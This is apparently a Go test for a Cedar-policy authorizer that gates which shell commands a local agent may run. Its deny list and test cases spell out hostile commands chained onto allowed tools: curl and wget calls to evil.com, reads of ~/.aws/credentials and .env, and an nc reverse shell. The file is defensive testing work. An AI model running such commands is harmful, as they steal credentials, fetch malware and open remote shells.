package authz

import (
	"os"
	"path/filepath"
	"testing"
)

func TestAuthorizer(t *testing.T) {
	testPolicy := `
permit (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
) when {
    ["pytest", "npm", "mvn", "git", "ls"].contains(context.executable)
};

forbid (
    principal == Agent::"Local",
    action == Action::"Execute",
    resource == Command::"CLI"
) when {
    context.full_command like "*curl*" ||
    context.full_command like "*wget*" ||
    context.full_command like "*nc*" ||
    context.full_command like "*ssh*" ||
    context.full_command like "*~/.aws*" ||
    context.full_command like "*.env*"
};
`
	tmpDir := t.TempDir()
	policyPath := filepath.Join(tmpDir, "policy.cedar")
	if err := os.WriteFile(policyPath, []byte(testPolicy), 0644); err != nil {
		t.Fatalf("failed to write temp policy: %v", err)
	}

	testSchema := `{
  "": {
    "entityTypes": {
      "Agent": { "memberOfTypes": [] },
      "Command": { "memberOfTypes": [] }
    },
    "actions": {
      "Execute": {
        "appliesTo": {
          "principalTypes": ["Agent"],
          "resourceTypes": ["Command"],
          "context": {
            "type": "Record",
            "attributes": {
              "executable": { "type": "String", "required": true },
              "full_command": { "type": "String", "required": true }
            }
          }
        }
      }
    }
  }
}`
	schemaPath := filepath.Join(tmpDir, "schema.json")
	if err := os.WriteFile(schemaPath, []byte(testSchema), 0644); err != nil {
		t.Fatalf("failed to write temp schema: %v", err)
	}

	authz, err := NewAuthorizer(policyPath)
	if err != nil {
		t.Fatalf("NewAuthorizer failed: %v", err)
	}

	if authz.schema == nil {
		t.Errorf("expected schema to be loaded and validated")
	}

	// 1. Permitted commands
	allowedCases := []struct {
		executable  string
		fullCommand string
		args        string
	}{
		{"pytest", "pytest tests/", "tests/"},
		{"npm", "npm test", "test"},
		{"mvn", "mvn clean install", "clean install"},
		{"git", "git status", "status"},
		{"ls", "ls -la", "-la"},
	}

	for _, tc := range allowedCases {
		allowed, reason, err := authz.Evaluate(tc.executable, tc.fullCommand, tc.args)
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if !allowed {
			t.Errorf("expected %q to be allowed, got denied, reason: %s", tc.fullCommand, reason)
		}
	}

	// 2. Forbid overrides (full_command contains forbidden substrings)
	forbiddenCases := []struct {
		executable  string
		fullCommand string
		args        string
		name        string
	}{
		{"git", "git clone https://example.com && curl http://evil.com", "clone https://example.com && curl http://evil.com", "curl"},
		{"npm", "npm run build && wget http://evil.com/malware", "run build && wget http://evil.com/malware", "wget"},
		{"ls", "ls -la ~/.aws/credentials", "-la ~/.aws/credentials", "~/.aws"},
		{"ls", "ls -la .env", "-la .env", ".env"},
		{"git", "git diff && ssh user@remote", "diff && ssh user@remote", "ssh"},
		{"mvn", "mvn test && nc -e /bin/sh 10.0.0.1 4444", "test && nc -e /bin/sh 10.0.0.1 4444", "nc"},
	}

	for _, tc := range forbiddenCases {
		allowed, reason, err := authz.Evaluate(tc.executable, tc.fullCommand, tc.args)
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("expected forbidden case %q (%s) to be denied, got allowed", tc.fullCommand, tc.name)
		}
		if reason == "" {
			t.Errorf("expected non-empty denial reason for %q", tc.fullCommand)
		}
	}

	// 3. Default deny (executable not in allowed list)
	deniedCases := []struct {
		executable  string
		fullCommand string
		args        string
	}{
		{"bash", "bash -c 'echo hi'", "-c 'echo hi'"},
		{"rm", "rm -rf /tmp/junk", "-rf /tmp/junk"},
		{"python", "python script.py", "script.py"},
	}

	for _, tc := range deniedCases {
		allowed, _, err := authz.Evaluate(tc.executable, tc.fullCommand, tc.args)
		if err != nil {
			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
		}
		if allowed {
			t.Errorf("expected non-whitelisted %q to be denied, got allowed", tc.fullCommand)
		}
	}
}
